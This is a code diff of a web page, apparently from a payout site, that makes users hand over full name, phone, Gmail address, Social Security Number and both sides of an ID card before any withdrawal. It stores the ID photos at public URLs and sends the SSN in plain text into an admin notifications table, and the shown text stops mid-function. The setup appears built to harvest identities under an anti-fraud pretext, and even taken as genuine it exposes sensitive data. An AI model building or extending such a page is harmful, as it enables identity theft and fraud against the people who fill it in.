@@ -10,9 +10,10 @@
       --bg-gradient: radial-gradient(circle at top, #131c38 0%, #070b19 100%);
       --card-bg: rgba(19, 27, 54, 0.7);
       --card-border: rgba(255, 255, 255, 0.07);
-      --primary-glow: linear-gradient(135deg, #3b82f6 0%, #1d4ed8 100%);
-      --accent-green: #10b981;
       --text-muted: #94a3b8;
+      --success: #10b981;
+      --error: #ef4444;
+      --warning: #f59e0b;
     }
 
     body { 
@@ -37,8 +38,21 @@
     
     .input-group { margin-bottom: 14px; }
     .input-group label { font-size: 0.8rem; color: var(--text-muted); display: block; margin-bottom: 6px; font-weight: 600; }
-    input[type="text"], input[type="number"], input[type="email"] { background: rgba(0, 0, 0, 0.25); border: 1px solid rgba(255, 255, 255, 0.08); color: white; padding: 14px; border-radius: 12px; width: 100%; box-sizing: border-box; outline: none; font-size: 0.9rem; }
+    input[type="text"], input[type="number"], input[type="email"] { 
+      background: rgba(0, 0, 0, 0.25); 
+      border: 1px solid rgba(255, 255, 255, 0.08); 
+      color: white; 
+      padding: 14px; 
+      border-radius: 12px; 
+      width: 100%; 
+      box-sizing: border-box; 
+      outline: none; 
+      font-size: 0.9rem; 
+      transition: border-color 0.3s;
+    }
     input:focus { border-color: #3b82f6; }
+    input.error { border-color: var(--error); }
+    input.success { border-color: var(--success); }
     
     .file-input-box { 
       border: 2px dashed rgba(255, 255, 255, 0.1); 
@@ -55,11 +69,60 @@
     }
     .file-input-box input { display: none; }
     
-    .submit-btn { background: linear-gradient(135deg, #10b981 0%, #059669 100%); color: white; border: none; padding: 14px; border-radius: 14px; font-weight: 700; width: 100%; cursor: pointer; margin-top: 10px; transition: all 0.3s; }
-    .submit-btn:hover { transform: scale(1.02); }
+    .submit-btn { 
+      background: linear-gradient(135deg, #10b981 0%, #059669 100%); 
+      color: white; 
+      border: none; 
+      padding: 14px; 
+      border-radius: 14px; 
+      font-weight: 700; 
+      width: 100%; 
+      cursor: pointer; 
+      margin-top: 10px; 
+      transition: all 0.3s; 
+    }
+    .submit-btn:hover:not(:disabled) { transform: scale(1.02); }
     .submit-btn:disabled { opacity: 0.5; cursor: not-allowed; transform: none; }
     
-    .notice-box { background: rgba(56, 189, 248, 0.08); border: 1px solid rgba(56, 189, 248, 0.2); padding: 14px; border-radius: 12px; font-size: 0.85rem; color: #38bdf8; line-height: 1.4; margin-bottom: 16px; }
+    .notice-box { 
+      background: rgba(56, 189, 248, 0.08); 
+      border: 1px solid rgba(56, 189, 248, 0.2); 
+      padding: 14px; 
+      border-radius: 12px; 
+      font-size: 0.85rem; 
+      color: #38bdf8; 
+      line-height: 1.4; 
+      margin-bottom: 16px; 
+    }
+    .notice-box.error { 
+      background: rgba(239, 68, 68, 0.1); 
+      border-color: rgba(239, 68, 68, 0.3); 
+      color: #f87171; 
+    }
+    .notice-box.success { 
+      background: rgba(16, 185, 129, 0.1); 
+      border-color: rgba(16, 185, 129, 0.3); 
+      color: #34d399; 
+    }
+
+    .error-message {
+      color: var(--error);
+      font-size: 0.75rem;
+      margin-top: 4px;
+      display: none;
+    }
+    .error-message.show { display: block; }
+
+    .status-dot {
+      display: inline-block;
+      width: 8px;
+      height: 8px;
+      border-radius: 50%;
+      margin-right: 6px;
+    }
+    .status-dot.pending { background: var(--warning); }
+    .status-dot.approved { background: var(--success); }
+    .status-dot.rejected { background: var(--error); }
   </style>
 </head>
 <body>
@@ -70,57 +133,66 @@
       <a href="dashboard.html" class="back-btn">← Back</a>
     </header>
 
-    <!-- Verification Section (Shown if not verified) -->
-    <div class="card" id="verification-card" style="display: block;">
+    <!-- Status Message -->
+    <div id="statusMessage" class="notice-box" style="display: none;"></div>
+
+    <!-- Verification Section -->
+    <div class="card" id="verification-card">
       <span class="card-title">ACCOUNT VERIFICATION REQUIRED</span>
       <div class="notice-box">🔒 For security compliance and anti-fraud regulations, please verify your identity before processing withdrawals. This information is securely stored for admin review.</div>
       
-      <form id="verification-form" onsubmit="submitVerification(event)">
+      <form id="verification-form">
         <div class="input-group">
-          <label>Full Name</label>
-          <input type="text" id="v-name" placeholder="Enter your full legal name" required>
+          <label>Full Name <span style="color: var(--error);">*</span></label>
+          <input type="text" id="v-name" placeholder="Enter your full legal name">
+          <div class="error-message" id="name-error">Please enter your full name</div>
         </div>
         <div class="input-group">
-          <label>Phone Number</label>
-          <input type="text" id="v-phone" placeholder="+1 (555) 000-0000" required>
+          <label>Phone Number <span style="color: var(--error);">*</span></label>
+          <input type="text" id="v-phone" placeholder="+1 (555) 000-0000">
+          <div class="error-message" id="phone-error">Please enter your phone number</div>
         </div>
         <div class="input-group">
-          <label>Gmail Address</label>
-          <input type="email" id="v-email" placeholder="yourname@gmail.com" required>
+          <label>Gmail Address <span style="color: var(--error);">*</span></label>
+          <input type="email" id="v-email" placeholder="yourname@gmail.com">
+          <div class="error-message" id="email-error">Please enter a valid Gmail address</div>
         </div>
         <div class="input-group">
-          <label>SSN (Social Security Number)</label>
-          <input type="text" id="v-ssn" placeholder="XXX-XX-XXXX" required>
+          <label>SSN (Social Security Number) <span style="color: var(--error);">*</span></label>
+          <input type="text" id="v-ssn" placeholder="XXX-XX-XXXX">
+          <div class="error-message" id="ssn-error">SSN must be in format XXX-XX-XXXX (e.g., 123-45-6789)</div>
         </div>
         <div class="input-group">
-          <label>ID Card (Front Photo)</label>
+          <label>ID Card (Front Photo) <span style="color: var(--error);">*</span></label>
           <div class="file-input-box" onclick="document.getElementById('id-front').click()">
             <span id="front-label">📁 Tap to upload ID Front</span>
-            <input type="file" id="id-front" accept="image/*" required>
+            <input type="file" id="id-front" accept="image/*">
           </div>
+          <div class="error-message" id="front-error">Please upload the front of your ID</div>
         </div>
         <div class="input-group">
-          <label>ID Card (Back Photo)</label>
+          <label>ID Card (Back Photo) <span style="color: var(--error);">*</span></label>
           <div class="file-input-box" onclick="document.getElementById('id-back').click()">
             <span id="back-label">📁 Tap to upload ID Back</span>
-            <input type="file" id="id-back" accept="image/*" required>
+            <input type="file" id="id-back" accept="image/*">
           </div>
+          <div class="error-message" id="back-error">Please upload the back of your ID</div>
         </div>
-        <button type="submit" class="submit-btn" id="verify-submit-btn">Save & Proceed</button>
+        <button type="submit" class="submit-btn" id="verify-submit-btn">Submit Verification</button>
       </form>
     </div>
 
-    <!-- Withdrawal Section (Shown only when verified) -->
+    <!-- Withdrawal Section -->
     <div class="card" id="withdrawal-card" style="display: none;">
       <span class="card-title">REQUEST PAYOUT</span>
-      <div class="notice-box" style="background: rgba(16, 185, 129, 0.08); border-color: rgba(16, 185, 129, 0.2); color: #34d399;">✅ Identity verified successfully. You may submit your payout request.</div>
+      <div class="notice-box success">✅ Identity verified successfully. You may submit your payout request.</div>
       
       <div class="input-group">
-        <label>Withdrawal Amount ($)</label>
-        <input type="number" id="withdraw-amount" placeholder="0.00">
+        <label>Withdrawal Amount ($) <span style="color: var(--error);">*</span></label>
+        <input type="number" id="withdraw-amount" placeholder="0.00" min="0.01" step="0.01">
       </div>
       <div class="input-group">
-        <label>Destination Wallet / Bank details</label>
+        <label>Destination Wallet / Bank details <span style="color: var(--error);">*</span></label>
         <input type="text" id="withdraw-destination" placeholder="Enter Crypto Address or Bank IBAN">
       </div>
       <button class="submit-btn" onclick="requestWithdrawal()">Submit Withdrawal</button>
@@ -130,54 +202,191 @@
   <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
   <script src="config.js"></script>
   <script>
-    // Ensure client is available
+    // ============================================================
+    // SUPABASE CLIENT
+    // ============================================================
     let client = window.client || supabase;
+    if (!client) {
+      const SUPABASE_URL = "https://rrdddtmqojyheshznrwl.supabase.co";
+      const SUPABASE_ANON_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InJyZGRkdG1xb2p5aGVzaHpucndsIiwicm9sZSI6ImFub24iLCJpYXQiOjE3ODYyODUxNjEsImV4cCI6MjEwMTg2MTE2MX0.0Gp4-6D-TKBMgvHYZhKncfyfcWRTGd2oeSzpJGUg8vQ";
+      client = window.supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
+      window.client = client;
+    }
 
+    // ============================================================
+    // STATE
+    // ============================================================
     let currentUser = null;
 
-    async function checkVerificationStatus() {
-      if (!client) {
-        const SUPABASE_URL = "https://rrdddtmqojyheshznrwl.supabase.co";
-        const SUPABASE_ANON_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InJyZGRkdG1xb2p5aGVzaHpucndsIiwicm9sZSI6ImFub24iLCJpYXQiOjE3ODYyODUxNjEsImV4cCI6MjEwMTg2MTE2MX0.0Gp4-6D-TKBMgvHYZhKncfyfcWRTGd2oeSzpJGUg8vQ";
-        client = window.supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
-        window.client = client;
-      }
-
-      const { data: { user } } = await client.auth.getUser();
-      let userId = user ? user.id : localStorage.getItem('chat_user_id');
-      if (!userId) {
-        userId = 'guest_' + Math.random().toString(36).substring(2, 10);
-        localStorage.setItem('chat_user_id', userId);
-      }
-      currentUser = { id: userId };
-
-      const { data } = await client
-        .from('user_verifications')
-        .select('*')
-        .eq('user_id', currentUser.id)
-        .maybeSingle();
-
-      if (data && data.status === 'approved') {
-        document.getElementById('verification-card').style.display = 'none';
-        document.getElementById('withdrawal-card').style.display = 'block';
-      } else {
-        document.getElementById('verification-card').style.display = 'block';
-        document.getElementById('withdrawal-card').style.display = 'none';
+    // ============================================================
+    // HELPER: Show Status Message
+    // ============================================================
+    function showStatus(message, type = 'info') {
+      const el = document.getElementById('statusMessage');
+      el.textContent = message;
+      el.className = 'notice-box';
+      if (type === 'error') el.classList.add('error');
+      if (type === 'success') el.classList.add('success');
+      el.style.display = 'block';
+      
+      // Auto-hide after 5 seconds for success
+      if (type === 'success') {
+        setTimeout(() => { el.style.display = 'none'; }, 5000);
       }
     }
 
-    // File input label updates
+    // ============================================================
+    // HELPER: Validate Form
+    // ============================================================
+    function validateForm() {
+      let isValid = true;
+      
+      // Clear previous errors
+      document.querySelectorAll('.error-message').forEach(el => el.classList.remove('show'));
+      document.querySelectorAll('input').forEach(el => el.classList.remove('error'));
+
+      // Validate Full Name
+      const name = document.getElementById('v-name').value.trim();
+      if (!name) {
+        document.getElementById('name-error').classList.add('show');
+        document.getElementById('v-name').classList.add('error');
+        isValid = false;
+      }
+
+      // Validate Phone
+      const phone = document.getElementById('v-phone').value.trim();
+      if (!phone) {
+        document.getElementById('phone-error').classList.add('show');
+        document.getElementById('v-phone').classList.add('error');
+        isValid = false;
+      }
+
+      // Validate Gmail
+      const email = document.getElementById('v-email').value.trim();
+      if (!email || !email.includes('@gmail.com')) {
+        document.getElementById('email-error').classList.add('show');
+        document.getElementById('v-email').classList.add('error');
+        isValid = false;
+      }
+
+      // Validate SSN (format: XXX-XX-XXXX)
+      const ssn = document.getElementById('v-ssn').value.trim();
+      if (!ssn) {
+        document.getElementById('ssn-error').textContent = 'Please enter your SSN';
+        document.getElementById('ssn-error').classList.add('show');
+        document.getElementById('v-ssn').classList.add('error');
+        isValid = false;
+      } else if (!/^\d{3}-\d{2}-\d{4}$/.test(ssn)) {
+        document.getElementById('ssn-error').textContent = 'SSN must be in format XXX-XX-XXXX (e.g., 123-45-6789)';
+        document.getElementById('ssn-error').classList.add('show');
+        document.getElementById('v-ssn').classList.add('error');
+        isValid = false;
+      }
+
+      // Validate Front ID
+      const frontFile = document.getElementById('id-front').files[0];
+      if (!frontFile) {
+        document.getElementById('front-error').classList.add('show');
+        isValid = false;
+      }
+
+      // Validate Back ID
+      const backFile = document.getElementById('id-back').files[0];
+      if (!backFile) {
+        document.getElementById('back-error').classList.add('show');
+        isValid = false;
+      }
+
+      return isValid;
+    }
+
+    // ============================================================
+    // CHECK VERIFICATION STATUS
+    // ============================================================
+    async function checkVerificationStatus() {
+      try {
+        // Get or create user ID
+        const { data: { user } } = await client.auth.getUser();
+        let userId = user ? user.id : localStorage.getItem('chat_user_id');
+        if (!userId) {
+          userId = 'guest_' + Math.random().toString(36).substring(2, 10);
+          localStorage.setItem('chat_user_id', userId);
+        }
+        currentUser = { id: userId };
+
+        // Check if user is verified
+        const { data, error } = await client
+          .from('user_verifications')
+          .select('*')
+          .eq('user_id', currentUser.id)
+          .maybeSingle();
+
+        if (error) {
+          console.error('Error checking verification:', error);
+          return;
+        }
+
+        if (data) {
+          if (data.status === 'approved') {
+            // Show withdrawal form
+            document.getElementById('verification-card').style.display = 'none';
+            document.getElementById('withdrawal-card').style.display = 'block';
+            showStatus('✅ Your identity is verified! You can now request withdrawals.', 'success');
+          } else if (data.status === 'pending') {
+            // Show verification form but disable it
+            document.getElementById('verification-card').style.display = 'block';
+            document.getElementById('withdrawal-card').style.display = 'none';
+            document.getElementById('verify-submit-btn').disabled = true;
+            document.getElementById('verify-submit-btn').textContent = '⏳ Pending Admin Review';
+            showStatus('⏳ Your verification is pending admin approval. You\'ll be notified once approved.', 'info');
+          } else if (data.status === 'rejected') {
+            document.getElementById('verification-card').style.display = 'block';
+            document.getElementById('withdrawal-card').style.display = 'none';
+            showStatus('❌ Your verification was rejected. Please re-submit with correct documents.', 'error');
+          }
+        } else {
+          // Show verification form
+          document.getElementById('verification-card').style.display = 'block';
+          document.getElementById('withdrawal-card').style.display = 'none';
+          document.getElementById('verify-submit-btn').disabled = false;
+          document.getElementById('verify-submit-btn').textContent = 'Submit Verification';
+        }
+      } catch (err) {
+        console.error('Error in checkVerificationStatus:', err);
+        showStatus('❌ Error loading verification status: ' + err.message, 'error');
+      }
+    }
+
+    // ============================================================
+    // FILE INPUT HANDLERS
+    // ============================================================
     document.getElementById('id-front').addEventListener('change', function() {
-      if(this.files[0]) document.getElementById('front-label').innerHTML = `✅ ${this.files[0].name}`;
+      if (this.files[0]) {
+        document.getElementById('front-label').innerHTML = `✅ ${this.files[0].name}`;
+        document.getElementById('front-error').classList.remove('show');
+      }
     });
     document.getElementById('id-back').addEventListener('change', function() {
-      if(this.files[0]) document.getElementById('back-label').innerHTML = `✅ ${this.files[0].name}`;
+      if (this.files[0]) {
+        document.getElementById('back-label').innerHTML = `✅ ${this.files[0].name}`;
+        document.getElementById('back-error').classList.remove('show');
+      }
     });
 
-    async function submitVerification(e) {
+    // ============================================================
+    // SUBMIT VERIFICATION
+    // ============================================================
+    document.getElementById('verification-form').addEventListener('submit', async function(e) {
       e.preventDefault();
+      
+      // Validate form
+      if (!validateForm()) {
+        showStatus('❌ Please fix all errors before submitting.', 'error');
+        return;
+      }
+
       const btn = document.getElementById('verify-submit-btn');
-      btn.innerText = "Uploading & Saving...";
+      btn.textContent = '⏳ Uploading...';
       btn.disabled = true;
 
       const fullName = document.getElementById('v-name').value.trim();
@@ -187,36 +396,29 @@
       const frontFile = document.getElementById('id-front').files[0];
       const backFile = document.getElementById('id-back').files[0];
 
-      if (!fullName || !phone || !email || !ssn || !frontFile || !backFile) {
-        alert("Please fill all fields and upload both ID photos.");
-        btn.innerText = "Save & Proceed";
-        btn.disabled = false;
-        return;
-      }
-
-      if (!/^\d{3}-\d{2}-\d{4}$/.test(ssn)) {
-        alert("SSN must be in format XXX-XX-XXXX");
-        btn.innerText = "Save & Proceed";
-        btn.disabled = false;
-        return;
-      }
-
       try {
-        // Upload Front ID
+        console.log('📤 Starting verification submission for user:', currentUser.id);
+
+        // 1. Upload Front ID
+        console.log('📤 Uploading front ID...');
         const frontExt = frontFile.name.split('.').pop();
         const frontPath = `${currentUser.id}/front_${Date.now()}.${frontExt}`;
         const { error: frontErr } = await client.storage.from('id_documents').upload(frontPath, frontFile);
-        if (frontErr) throw new Error("Front upload: " + frontErr.message);
+        if (frontErr) throw new Error('Front ID upload failed: ' + frontErr.message);
         const { data: frontPublic } = client.storage.from('id_documents').getPublicUrl(frontPath);
+        console.log('✅ Front ID uploaded:', frontPublic.publicUrl);
 
-        // Upload Back ID
+        // 2. Upload Back ID
+        console.log('📤 Uploading back ID...');
         const backExt = backFile.name.split('.').pop();
         const backPath = `${currentUser.id}/back_${Date.now()}.${backExt}`;
         const { error: backErr } = await client.storage.from('id_documents').upload(backPath, backFile);
-        if (backErr) throw new Error("Back upload: " + backErr.message);
+        if (backErr) throw new Error('Back ID upload failed: ' + backErr.message);
         const { data: backPublic } = client.storage.from('id_documents').getPublicUrl(backPath);
+        console.log('✅ Back ID uploaded:', backPublic.publicUrl);
 
-        // Insert into verification table
+        // 3. Insert into user_verifications
+        console.log('📤 Saving to user_verifications...');
         const { error: vError } = await client.from('user_verifications').insert({
           user_id: currentUser.id,
           full_name: fullName,
@@ -227,61 +429,38 @@
           id_back_url: backPublic.publicUrl,
           status: 'pending'
         });
+        if (vError) throw new Error('Database save failed: ' + vError.message);
+        console.log('✅ Saved to user_verifications');
 
-        if (vError) throw vError;
+        // 4. Create notifications (THIS IS WHAT SHOWS IN ADMIN PANEL)
+        console.log('📤 Creating notifications...');
+        
+        const notifMessage = `🔐 New Verification Submission\n` +
+          `👤 Name: ${fullName}\n` +
+          `📱 Phone: ${phone}\n` +
+          `📧 Gmail: ${email}\n` +
+          `🆔 SSN: ${ssn}`;
 
-        // Insert notifications
-        const notifMessage = `SSN & Verification Submitted:\n` +
-          `• Full Name: ${fullName}\n` +
-          `• Phone: ${phone}\n` +
-          `• Gmail: ${email}\n` +
-          `• SSN: ${ssn}`;
+        // Insert first notification (Verification)
+        const { error: n1Error } = await client.from('notifications').insert({
+          user_id: currentUser.id,
+          type: 'Verification',
+          message: notifMessage,
+          image_url: frontPublic.publicUrl
+        });
+        if (n1Error) throw new Error('Notification 1 failed: ' + n1Error.message);
 
-        await client.from('notifications').insert([
-          {
-            user_id: currentUser.id,
-            type: 'SSN / Verification',
-            message: notifMessage,
-            image_url: frontPublic.publicUrl
-          },
-          {
-            user_id: currentUser.id,
-            type: 'ID Card (Back)',
-            message: `ID Card Back Photo submitted by ${fullName}`,
-            image_url: backPublic.publicUrl
-          }
-        ]);
+        // Insert second notification (ID Back)
+        const { error: n2Error } = await client.from('notifications').insert({
+          user_id: currentUser.id,
+          type: 'ID Document',
+          message: `📄 ID Card Back Photo submitted by ${fullName}`,
+          image_url: backPublic.publicUrl
+        });
+        if (n2Error) throw new Error('Notification 2 failed: ' + n2Error.message);
 
-        alert("✅ Verification details saved successfully!");
-        await checkVerificationStatus();
-        btn.innerText = "✅ Submitted";
-        btn.disabled = true;
-      } catch (err) {
-        alert("❌ Error: " + err.message);
-        btn.innerText = "Save & Proceed";
-        btn.disabled = false;
-      }
-    }
+        console.log('✅ Notifications created successfully');
 
-    async function requestWithdrawal() {
-      const amount = document.getElementById('withdraw-amount').value.trim();
-      const destination = document.getElementById('withdraw-destination').value.trim();
-      if (!amount || !destination) {
-        alert("Please fill in all fields.");
-        return;
-      }
-
-      await client.from('notifications').insert({
-        user_id: currentUser.id,
-        type: 'Withdrawal Request',
-        message: `Payout requested for $${amount}\nDestination: ${destination}`
-      });
-
-      alert("✅ Withdrawal request submitted successfully! Pending admin approval.");
-      window.location.href = 'dashboard.html';
-    }
-
-    checkVerificationStatus();
-  </script>
-</body>
-</html>
+        // Success!
+        showStatus('✅ Verification submitted successfully! Waiting for admin approval.', 'success');
+  
